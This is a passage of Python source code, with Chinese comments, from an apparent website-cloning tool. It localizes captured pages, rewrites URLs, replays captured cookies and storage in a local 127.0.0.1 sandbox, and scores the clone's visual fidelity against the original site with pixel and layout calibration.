            return self._inject_after_head(html, script)

        bg_css = self._bg_freeze_css()

        strip_pack = bool(self._strategy_pack.disable_hydration)
        stripped_total = 0

        def finalize(html: str, route: str) -> str:
            nonlocal stripped_total
            # 模式策略包: 水合类站点以采集期静态 DOM 为权威, 落盘前剥离应用脚本
            # (活体阶段只对 Next/Nuxt 早识别剥离; 这里补齐识别后的整类开关)
            if strip_pack:
                html, n = _strip_hydration_html(html)
                stripped_total += n
            # <base href> 会让克隆页所有未改写的相对引用按原站指定的基准解析
            # (指向 CDN/原站即整类漂移); 剥离后恢复"按克隆页自身路径解析"
            # 的统一不变量 —— 与 page_dir 影子落盘机制配套
            localized = _BASE_TAG_RE.sub("", rewrite_js_navigation(html))
            floor = self._band_floor_of(localized)
            if route == "/":
                self._band_floor = floor
            localized = scope_bake_css(localized, floor)
            localized = scope_viewport_css(localized, floor, self._band_floor_of(localized, 768))
            if route == "/" and self._calib_css:
                localized = self._put_calib(localized, self._calib_css)
            localized = self._inject_spa_disguise(localized, route)
            localized = inject_state_restore(localized)
            if bg_css:
                localized = self._inject_after_head(localized, bg_css)
            localized = self._inject_after_head(localized, sim_script)
            return _utf8_charset(_inject_responsive(localized))

        html_pairs = _html_escaped_pairs(pairs)
        for route, html in pages:
            fname = "index.html" if route == "/" else f"p__{slugify(route)}.html"
            localized = finalize(apply_replacements(html, html_pairs), route)
            (self.ws / fname).write_text(localized, encoding="utf-8")
            pages_map[route] = fname
            if strip_pack and stripped_total and route == "/":
                self.log("RENDER", f"策略包水合剥离({self._strategy_pack.pattern}): "
                                   f"落盘前剥离 {stripped_total} 个应用脚本, 静态 DOM 权威")
            # 目录型目标页: 在原路径落一份副本(index.html), 使页面相对路径
            # (运行时拼接的懒加载 chunk 等)与原站解析一致
            if route == "/" and self._page_dir != "/":
                # 真实页面只落在原路径(相对路径基准); 根入口改为保 hash 的
                # 跳转桩 —— 容器根路径 / 工作台预览 /preview/<id>/ 打开时
                # 自动落到 page_dir, 懒加载 chunk 等相对引用不漂移。
                shadow = self.ws / self._page_dir.lstrip("/") / "index.html"
                shadow.parent.mkdir(parents=True, exist_ok=True)
                shadow.write_text(localized, encoding="utf-8")
                pages_map[self._page_dir] = f"{self._page_dir.lstrip('/')}index.html"
                pages_map[self._page_dir.rstrip("/")] = f"{self._page_dir.lstrip('/')}index.html"
                stub = ("<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
                        "<script>(function(){var h=location.hash||'';"
                        "location.replace(" + _safe_json(self._page_dir.lstrip("/"))
                        + "+h);})();</script>"
                        "<noscript><meta http-equiv=\"refresh\" content=\"0;url="
                        + _html.escape(self._page_dir.lstrip("/"), quote=True)
                        + "\"></noscript>"
                        "</head><body></body></html>")
                (self.ws / "index.html").write_text(stub, encoding="utf-8")
        for i, (_src, html) in enumerate(iframe_pages):
            localized = _BASE_TAG_RE.sub(
                "", rewrite_js_navigation(apply_replacements(html, html_pairs)))
            localized = scope_bake_css(localized, self._band_floor_of(localized))
            localized = self._inject_after_head(localized, sim_script)
            localized = _utf8_charset(_inject_responsive(localized))
            (self.ws / f"iframe_{i + 1}.html").write_text(
                localized, encoding="utf-8")
            pages_map[f"/iframe_{i + 1}.html"] = f"iframe_{i + 1}.html"
        for i, (_src, html, _text) in enumerate(frame_records):
            localized = _BASE_TAG_RE.sub(
                "", rewrite_js_navigation(apply_replacements(html, html_pairs)))
            localized = scope_bake_css(localized, self._band_floor_of(localized))
            localized = self._inject_after_head(localized, sim_script)
            localized = _utf8_charset(_inject_responsive(localized))
            (self.ws / "frames" / f"frame_{i + 1}.html").write_text(
                localized, encoding="utf-8")
            pages_map[f"/frames/frame_{i + 1}.html"] = f"frames/frame_{i + 1}.html"

    def _rewrite_js_files(self, results: dict, pairs: list):
        """JS 内容本地化: URL 字面量替换 + 导航逃逸护栏改写(含原名副本)。"""
        for info in results.values():
            if info["ext"] not in (".js", ".mjs", ".cjs"):
                continue
            targets = [info["abs_path"]]
            rel = (info.get("local") or "").lstrip("/")
            if rel:
                alias = self.ws / rel
                if alias != info["abs_path"]:
                    targets.append(alias)
            for path in targets:
                try:
                    if not path.is_file() or path.stat().st_size > config.JS_REWRITE_MAX_BYTES:
                        continue
                    text = path.read_text(encoding="utf-8", errors="replace")
                    rewritten = rewrite_js_navigation(apply_replacements(text, pairs))
                    if rewritten != text:
                        path.write_text(rewritten, encoding="utf-8")
                except OSError:
                    continue

    @classmethod
    def _fill_variants_bulk(cls, pairs: dict, items: list, page_netloc: str):
        """对 items=[(url, local)] 逐个做 _fill_variants, 结果与逐个调用完全相同。

        整批校验(全部 C 层子串计数/扫描): 每个 URL 都以小写 http:// 或 https://
        开头、纯 ASCII、不含 urlsplit 会删除或另行处理的字符(\t \r \n # [ ])。
        此时 urlsplit 的切分完全确定: netloc 止于主机后首个 / 或 ?, path 止于
        ?, 各变体都是 url 的切片, 直接用 str.find 定位; 任一不满足则逐个走
        _fill_variants(其内部再按严格正则判定或回落 _variants)。"""
        if not items:
            return
        joined = "\n".join([u for u, _ in items])
        n_http = joined.count("\nhttp://") + joined.startswith("http://")
        n_https = joined.count("\nhttps://") + joined.startswith("https://")
        if not (n_http + n_https == len(items) == joined.count("\n") + 1
                and joined.isascii() and not any(ch in joined for ch in "\t\r#[]")):
            for url, local in items:
                cls._fill_variants(pairs, url, local, page_netloc)
            return
        for url, local in items:
            host_at = 8 if url[4] == "s" else 7          # https:// | http://
            slash = url.find("/", host_at)
            query = url.find("?", host_at)
            if slash < 0 or 0 <= query < slash:           # 无路径
                stem = url if query < 0 else url[:query]
                pairs[url] = local
                pairs[stem] = local
                bare = stem[host_at - 2:]
                if len(bare) > 5:
                    pairs[bare] = local
                if query >= 0 and query > host_at and len(url) - host_at + 2 > 5:
                    pairs[url[host_at - 2:]] = local
                continue
            stem = url if query < 0 else url[:query]      # scheme://netloc/path
            pairs[url] = local
            pairs[stem] = local
            bare = stem[host_at - 2:]                     # //netloc/path
            if len(bare) > 5:
                pairs[bare] = local
            same = url[host_at:slash] == page_netloc
            path = stem[slash:]
            if len(path) > 5 and same:
                pairs[path] = local
            if query >= 0 and slash > host_at:
                # 带查询串的协议相对/站内相对写法也要整串登记: 否则只剩去参的 stem 能命中,
                # 同一端点不同参数(/_next/image?url=A / ?url=B)被 stem 前缀改写成同一张图
                if len(url) - host_at + 2 > 5:
                    pairs[url[host_at - 2:]] = local
                if same and len(url) - slash > 5:
                    pairs[url[slash:]] = local

    @classmethod
    def _fill_variants(cls, pairs: dict, url: str, local: str, page_netloc: str):
        """pairs[v] = local 对 _variants(url) 的每个变体 —— _compose_pairs 热循环专用。

        严格形态绝对 URL(_STRICT_ABS_URL_RE)的变体都是 url 的切片: 去查询串 =
        url[:路径末], 去 scheme = 再去掉 "scheme:" 前缀, 免去 urlsplit 与两个临时
        set。替换表最终按长度降序稳定排序, 而同一 URL 的各变体长度两两不同
        (url ≥ 去查询串 > 去 scheme > 纯路径), 插入先后不影响最终顺序; 非严格
        形态回落 _variants, 输出逐项一致。"""
        m = _STRICT_ABS_URL_RE.match(url)
        if m is None:
            for variant in cls._variants(url, page_netloc):
                pairs[variant] = local
            return
        path = m.group(3)
        stem = url[:m.end(3) if path else m.end(2)]      # scheme://netloc/path
        pairs[url] = local
        pairs[stem] = local
        bare = stem[m.end(1) + 1:]                        # //netloc/path
        if len(bare) > 5:
            pairs[bare] = local
        if path and len(path) > 5 and m.group(2) == page_netloc:
            pairs[path] = local
        if len(url) > len(stem):                          # 带查询串: 整串的相对写法
            if len(url) - m.end(1) - 1 > 5:
                pairs[url[m.end(1) + 1:]] = local
            if path and m.group(2) == page_netloc and len(url) - m.start(3) > 5:
                pairs[url[m.start(3):]] = local

    @staticmethod
    def _variants(url: str, page_netloc: str):
        scheme, netloc, path = _split_scheme_netloc_path(url)
        candidates = {url, f"{scheme}://{netloc}{path}", f"//{netloc}{path}"}
        if netloc == page_netloc and path.startswith("/"):
            candidates.add(path)
        if "?" in url and netloc:
            rest = url[url.find("//") :] if "//" in url else ""
            if rest.startswith("//"):
                candidates.add(rest)
                if netloc == page_netloc and path.startswith("/"):
                    i = rest.find("/", 2)
                    if i > 0:
                        candidates.add(rest[i:])
        return {c for c in candidates
                if c and len(c) > 5 and c.startswith(("http", "//", "/"))}

    # ------------------------------------------------------------------
    def _write_final_diff(self):
        """收敛后生成一次差异热力图(两图缩放结果已在缓存, 不再解码)。"""
        original, cloned = self.ws / "original_preview.png", self.ws / "cloned_preview.png"
        if original.is_file() and cloned.is_file():
            try:
                write_diff_preview(original, cloned, self.ws / "diff_preview.png")
            except Exception as exc:
                self.log("WARN", f"差异热力图生成失败: {exc}")

    def _region_cells(self):
        """AI 修复的区域线索: 像素差分定位的纯色区域色差格(失败返回 None)。"""
        original, cloned = self.ws / "original_preview.png", self.ws / "cloned_preview.png"
        try:
            return pixel_calibrator.divergent_cells(original, cloned)
        except Exception:
            return None

    def _make_render_and_score(self, ctx, defer_diff: bool = False):
        """构造"本地离线渲染 + 三通道评分"闭包(AI 修复循环复用)。

        defer_diff: 不写交互轨热力图(由 _write_final_diff 在收敛后统一生成);
        手动 AI 修复等入口保持每次评分即写热力图。"""
        diff_path = None if defer_diff else self.ws / "diff_preview.png"

        def render_and_score():
            server = _LocalPreviewServer(
                self.ws, use_tape=self._strategy_pack.net_tape)
            server.start()
            base = f"http://127.0.0.1:{server.port}"
            failed_local, remote_missing = set(), set()
            page = ctx.new_page()
            page.set_default_timeout(30000)
            with suppress(Exception):
                page.add_init_script(SCORE_TIMER_GUARD_JS)
            # W4 状态注入(模式策略包): 采集期终态 Cookie(含 httpOnly)/Storage
            # 以沙盒原点(127.0.0.1)回放, 让运行时的登录态/配置态判断与源站一致。
            # HTML 注入版(inject_state_restore)无法恢复 httpOnly —— 此处补全。
            if self._strategy_pack.state_replay:
                snapshot = self.ws / "state_snapshot.json"
                if snapshot.is_file():
                    try:
                        payload = json.loads(snapshot.read_text(encoding="utf-8"))
                    except (OSError, ValueError):
                        payload = {}
                    sandbox_cookies = []
                    for c in payload.get("cookies", []):
                        if not c.get("name"):
                            continue
                        sandbox_cookies.append({
                            "name": c["name"], "value": c.get("value") or "",
                            "domain": "127.0.0.1", "path": c.get("path") or "/",
                            "httpOnly": bool(c.get("httpOnly")),
                            "secure": False, "sameSite": "Lax",
                        })
                    if sandbox_cookies:
                        with suppress(Exception):
                            ctx.add_cookies(sandbox_cookies)
                    seeds = {"local": payload.get("local", {}),
                             "session": payload.get("session", {})}
                    blob = json.dumps(seeds, ensure_ascii=False)[:1_000_000]
                    with suppress(Exception):
                        page.add_init_script(
                            "try{var d=" + blob +
                            ";['local','session'].forEach(function(t){"
                            "var s=t==='local'?window.localStorage:window.sessionStorage;"
                            "var m=d[t]||{};for(var k in m){try{"
                            "if(s.getItem(k)===null)s.setItem(k,m[k]);"
                            "}catch(e){}}});}catch(e){}")

            def _route_guard(route):
                try:
                    if route.request.url.startswith(base):
                        route.continue_()
                    else:
                        remote_missing.add(route.request.url)
                        route.abort()
                except Exception:
                    with suppress(Exception):
                        route.abort()

            def _fidelity_guard(route):
                try:
                    if route.request.url.startswith(("file:", "data:", "blob:", "cid:")):
                        route.continue_()
                    else:
                        route.abort()
                except Exception:
                    with suppress(Exception):
                        route.abort()

            def _on_resp(resp):
                try:
                    rt = resp.request.resource_type
                    if rt not in ASSET_RESOURCE_TYPES and not (
                            rt in ("fetch", "xhr") and _is_runtime_asset(resp.url)):
                        return
                    if resp.status >= 400:
                        failed_local.add(urlsplit(resp.url).path or "/")
                        return
                    # SPA 兜底毒化感知: 静态资产拿到 200 的 text/html 是
                    # 兜底壳而非真实字节, 视同失败喂给回补(不修会以
                    # HTML 当 JS/CSS 解析崩溃且永不再重试)
                    if resp.status == 200 and resp.url.startswith(base) \
                            and resp.request.resource_type in (
                                "script", "stylesheet", "image", "font", "media"):
                        ctype = (resp.headers or {}).get("content-type", "")
                        if "text/html" in ctype:
                            failed_local.add(urlsplit(resp.url).path or "/")
                except Exception:
                    return

            def _on_fail(req):
                try:
                    if req.resource_type not in ASSET_RESOURCE_TYPES and not (
                            req.resource_type in ("fetch", "xhr") and _is_runtime_asset(req.url)):
                        return
                    url = req.url
                    if url.startswith(base):
                        # 媒体元素换源/暂停时主动取消在途请求(ERR_ABORTED), 文件其实在:
                        # 记成缺失只会让修复循环误判"缺失不降"而提前收敛
                        if req.resource_type == "media" and "ABORTED" in str(req.failure or ""):
                            return
                        failed_local.add(urlsplit(url).path or "/")
                except Exception:
                    return

            def _render_fidelity():
                """N1 保真轨: MHTML 确定性渲染(Chromium 对 MHTML 默认禁脚本), 与交互轨
                分开评分 —— 回放保真由构造保证。MHTML 不随修复循环变化 → 每任务一次。"""
                if self._fidelity_rendered or not (self.ws / 'capture.mhtml').is_file():
                    return
                self._fidelity_rendered = True
                with suppress(OSError):   # 防上一轮/重建残留截图被误评
                    (self.ws / 'fidelity_preview.png').unlink()
                t_fid = time.monotonic()
                fpage = ctx.new_page()
                try:
                    # 离线守卫: 归档内资源由 Chromium 直接供给(不经网络层),
                    # 归档外的引用一律中止 —— 保真轨必须确定且不回源
                    fpage.route("**/*", _fidelity_guard)
                    fpage.goto('file://' + str(self.ws / 'capture.mhtml'),
                               wait_until='load', timeout=30000)
                    with suppress(Exception):
                        self._settle(fpage, cap_ms=2000)
                    self._full_shot(fpage, self.ws / 'fidelity_preview.png', "保真轨")
                    f_text = fpage.evaluate(TEXT_EXTRACT_JS)
                    (self.ws / 'fidelity_text.txt').write_text(
                        f_text or '', encoding='utf-8')
                except Exception as exc:
                    self.log('WARN', f'保真轨渲染失败: {exc}')
                finally:
                    with suppress(Exception):
                        fpage.close()
                    self._phase("评分-保真轨渲染", t_fid)

            def _score_fidelity(original, orig_text, inter_score):
                """N1 保真轨评分: MHTML 确定性渲染 vs 原站(独立于交互轨, 每任务一次)。"""
                fid_png = self.ws / 'fidelity_preview.png'
                fid_txt = self.ws / 'fidelity_text.txt'
                if not fid_png.is_file() or self._fidelity_score is not None:
                    return
                t_sc = time.monotonic()
                try:
                    f_detail = compute_visual_similarity(
                        original, fid_png,
                        diff_path=self.ws / 'fidelity_diff.png',
                        orig_text=orig_text,
                        clone_text=fid_txt.read_text(errors='replace') if fid_txt.is_file() else '')
                    self._fidelity_score = f_detail.get('score')
                    self.log("RENDER", f"保真轨评分: {self._fidelity_score} (交互轨: {inter_score})")
                except Exception as exc:
                    self.log("WARN", f"保真轨评分失败: {exc}")
                self._phase("评分-计算", t_sc)

            try:
                page.route("**/*", _route_guard)
                page.on("response", _on_resp)
                page.on("requestfailed", _on_fail)
                # 混合等待: dcl 锚定(重型站 load 可能超时) → 短 load 等待
                # (重水合 SPA 需要资源齐) → 网络静置封顶 → 滚动 → 缓释
                # (W1 起参数由模式策略包供给, 值=现行全局行为)
                self._load_clone(page, base, phases=True)
                if not getattr(self, "_clone_probed", False):
                    # 与原站同一探针: 两侧样本对照即可归因装饰层在克隆侧丢失
                    self._clone_probed = True
                    with suppress(Exception):
                        cp = page.evaluate(PAGE_PROBE_JS)
                        self.log("RENDER", "克隆版面特征: " + ", ".join(
                            f"{k}={v}" for k, v in cp.items()))
                tp = time.monotonic()
                self._full_shot(page, self.ws / "cloned_preview.png", "克隆页")
                clone_text = page.evaluate(TEXT_EXTRACT_JS)
                (self.ws / "cloned_text.txt").write_text(clone_text or "",
                                                         encoding="utf-8")
                tp = self._phase("评分-克隆截图", tp)
            except CloneUnresponsive as exc:
                # 卡死的页面上截图也会挂起: 交互轨本轮作废, 由保真轨(MHTML 禁脚本)出分
                self.log("WARN", f"克隆页渲染失败: {exc}")
                with suppress(OSError):
                    (self.ws / "cloned_preview.png").unlink()
                clone_text = ""
            except Exception as exc:
                self.log("WARN", f"克隆页渲染失败: {exc}")
                with suppress(Exception):
                    self._full_shot(page, self.ws / "cloned_preview.png", "克隆页")
                clone_text = ""
            remote_missing.discard("")
            # 页面/沙盒在评分与 A1 校准全程保持存活(校准需在活页上 elementFromPoint
            # 并重导航重截图; 旧实现在此前已 close/stop, 校准恒抛异常从未生效)
            try:
                original = self.ws / "original_preview.png"
                cloned = self.ws / "cloned_preview.png"
                if not original.is_file():
                    return None, failed_local, remote_missing
                if not cloned.is_file():
                    # 交互轨截图失败: 保真轨仍可独立出分(头条分数双轨取优)
                    _render_fidelity()
                    with suppress(Exception):
                        _score_fidelity(original, (self.ws / "original_text.txt").read_text(
                            encoding="utf-8", errors="replace")
                            if (self.ws / "original_text.txt").is_file() else "", None)
                    return None, failed_local, remote_missing
                try:
                    orig_text = (self.ws / "original_text.txt").read_text(
                        encoding="utf-8", errors="replace") if (self.ws / "original_text.txt").is_file() else ""
                    tp = time.monotonic()
                    detail = compute_visual_similarity(
                        original, cloned, diff_path=diff_path,
                        orig_text=orig_text, clone_text=clone_text or "",
                        prime_calibration=self._calibrations < 2)
                    tp = self._phase("评分-计算", tp)
                    # A1 完整版: 像素差分 → 元素映射 → CSS 覆盖合成(确定性校准闭环)。
                    # 网格差分定位色差格(原站侧纯色格才取), elementFromPoint 映射到
                    # 克隆 DOM 元素, 以原站格色生成覆盖 —— 注入后重渲染重评分一轮。
                    if detail is not None and (detail.get('score') or 0) < 99 \
                            and self._calibrations < 2 and failed_local \
                            and not getattr(self, "_calib_deferred", False):
                        # 本轮还有本地资源 404/兜底壳: 差异格多半是待回补的图, 按缺图时的
                        # 截图上色会在资源到齐后变成色块 —— 让给下一轮(只让一次: 源站本身
                        # 就 404 的资源永远回补不上, 不能因此永不校准)
                        self._calib_deferred = True
                        self.log("RENDER", f"像素校准暂缓: {len(failed_local)} 个本地资源待回补")
                    elif detail is not None and (detail.get('score') or 0) < 99 \
                            and self._calibrations < 2:
                        try:
                            cal_cells = pixel_calibrator.divergent_cells(
                                original, cloned)
                            if cal_cells:
                                big_gaps = [c0 for c0 in cal_cells if c0[3] > 200]
                                if len(big_gaps) >= 4:
                                    self.log("RENDER", f"像素校准诊断: {len(big_gaps)} 格差距>200"
                                             f" = 大面积区域缺失(回放数据缺口, 归 W2/W3), "
                                             f"校准仅能补色不能补区域")
                                    if len(big_gaps) * 2 >= len(cal_cells):
                                        # 差异以区域缺失为主: 补色覆盖无从提分(语料里此情形
                                        # 全部持平或回滚), 省掉一整次克隆重渲染
                                        self.log("RENDER", "像素校准跳过: 差异以区域缺失为主")
                                        self._calibrations = 2
                                        cal_cells = []
                                cal_css = pixel_calibrator.element_css(page, cal_cells) \
                                    if cal_cells else ""
                                if cal_css:
                                    # 累积(第二轮在已校准页上测得的是新增差异格)并持久化,
                                    # 后续修复轮 _localize 重写页面时重新注入, 不被覆盖
                                    prev_css, prev_detail = self._calib_css, detail
                                    prev_shot = cloned.read_bytes()
                                    prev_text = clone_text
                                    merged = list(dict.fromkeys(
                                        (self._calib_css + "\n" + cal_css).split("\n")))
                                    self._calib_css = "\n".join(r for r in merged if r)
                                    cal_css = self._calib_css
                                    # 写入真实被渲染的页面: 目录型 URL 时 index.html 是跳转桩
                                    idx_html = self._main_page_file()
                                    if idx_html.is_file():
                                        doc = idx_html.read_text(encoding='utf-8',
                                                                 errors='replace')
                                        prev_doc = doc
                                        cal_style = self._calib_style(cal_css)
                                        if 'data-clone-calib' in doc:
                                            doc = re.sub(
                                                r'<style data-clone-calib>.*?</style>',
                                                lambda _m: cal_style, doc, count=1, flags=re.S)
                                        else:
                                            doc = self._put_calib(doc, cal_css)
                                        idx_html.write_text(doc, encoding='utf-8')
                                        self._calibrations += 1
                                        self.log("RENDER", f"像素校准: {len(cal_cells)} "
                                                 f"格差 → {len(cal_css.splitlines())} 条覆盖, 重评分")
                                        self._load_clone(page, base)
                                        self._full_shot(page, cloned, "克隆页")
                                        clone_text = page.evaluate(TEXT_EXTRACT_JS)
                                        (self.ws / 'cloned_text.txt').write_text(
                                            clone_text or '', encoding='utf-8')
                                        detail = compute_visual_similarity(
                                            original, cloned, diff_path=diff_path,
                                            orig_text=orig_text, clone_text=clone_text or '',
                                            prime_calibration=self._calibrations < 2)
                                        # 回滚守卫: 校准必须净提升, 否则撤销覆盖并恢复上一版
                                        # 截图/文本/明细(色块覆盖误伤内容时不允许拉低分数)
                                        # 持平同样回滚并停手: 无增益的覆盖只是风险, 后续修复轮再试也只白付一次重渲染
                                        if (detail.get('score') or 0) <= (prev_detail.get('score') or 0):
                                            self.log("RENDER", f"像素校准未提升"
                                                     f"({prev_detail.get('score')}→{detail.get('score')}), 已回滚")
                                            self._calib_css = prev_css
                                            idx_html.write_text(prev_doc, encoding='utf-8')
                                            cloned.write_bytes(prev_shot)
                                            clone_text = prev_text
                                            (self.ws / 'cloned_text.txt').write_text(
                                                clone_text or '', encoding='utf-8')
                                            detail = prev_detail
                                            self._calibrations = 2   # 不再尝试
                        except Exception as exc:
                            self.log('WARN', f'像素校准失败: {exc}')
                        tp = self._phase("评分-像素校准", tp)
                    # 布局校准: 版面块高度对齐原站, 消除累积错位(每任务一次, 不提升即回滚)
                    if detail is not None and (detail.get('score') or 0) < 99 \
                            and not self._layout_calibrated:
                        self._layout_calibrated = True
                        try:
                            detail, clone_text = self._layout_calibrate(
                                page, base, original, cloned, detail, clone_text,
                                orig_text, diff_path)
                        except Exception as exc:
                            self.log('WARN', f'布局校准失败: {exc}')
                        tp = self._phase("评分-布局校准", tp)
                    # N1 保真轨: 交互轨已近满分时保真轨无法改变头条分数(双轨取优), 跳过其渲染
                    if detail is None or (detail.get('score') or 0) < config.FIDELITY_SKIP_ABOVE:
                        _render_fidelity()
                        _score_fidelity(original, orig_text,
                                        detail.get('score') if detail is not None else None)
                    return detail, failed_local, remote_missing
                except Exception as exc:
                    self.log("WARN", f"评分计算失败: {exc}")
                    return None, failed_local, remote_missing
            finally:
                with suppress(Exception):
                    page.close()
                # W4 防跨站污染: cookie 按 domain 作用、无视端口 —— 不清理
                # 会泄漏给同 worker 后续任务的沙盒渲染(W4 首轮验收教训)
                with suppress(Exception):
                    ctx.clear_cookies()
                server.stop()

        return render_and_score

    # ------------------------------------------------------------------
    def _collect_stats(self) -> dict:
        """以任务工作空间真实文件为准统计; 固化产物(HTML/Mock)也计入总体积。"""
        stats = {"css": 0, "js": 0, "img": 0, "font": 0, "media": 0,
                 "misc": 0, "total_bytes": 0, "assets_total": 0}
        folder_to_bucket = {"css": "css", "js": "js", "img": "img",
                            "fonts": "font", "media": "media", "misc": "misc"}
        static_root = self.ws / "static"
        if static_root.is_dir():
            for folder in static_root.iterdir():
                bucket = folder_to_bucket.get(folder.name)
                if bucket is None or not folder.is_dir():
                    continue
                for file in folder.rglob("*"):
                    if file.is_file():
                        stats[bucket] += 1
                        stats["assets_total"] += 1
                        stats["total_bytes"] += file.stat().st_size

        # 内联固化产物(index/子页/iframe/frames 页/mock/元数据)计入总大小
        for entry in self.ws.rglob("*"):
            if entry.is_file() and entry.suffix in (".html", ".json") \
                    and "flask_app" not in entry.parts \
                    and "static" not in entry.parts:
                with suppress(OSError):
                    stats["total_bytes"] += entry.stat().st_size

        # 防御: 若文件扫描为零但下载期确实落盘过(极端权限场景), 回退累计器
        if stats["assets_total"] == 0 and self._stat_accum["bytes"] > 0:
            stats["css"] = self._stat_accum["css"]
            stats["js"] = self._stat_accum["js"]
            stats["img"] = self._stat_accum["img"]
            stats["font"] = self._stat_accum["fonts"]
            stats["media"] = self._stat_accum["media"]
            stats["misc"] = self._stat_accum["misc"]
            stats["assets_total"] = (stats["css"] + stats["js"] + stats["img"]
                                    + stats["font"] + stats["media"] + stats["misc"])
            stats["total_bytes"] = self._stat_accum["bytes"]

        stats["total_bytes_h"] = _fmt_size(stats["total_bytes"])
        return stats
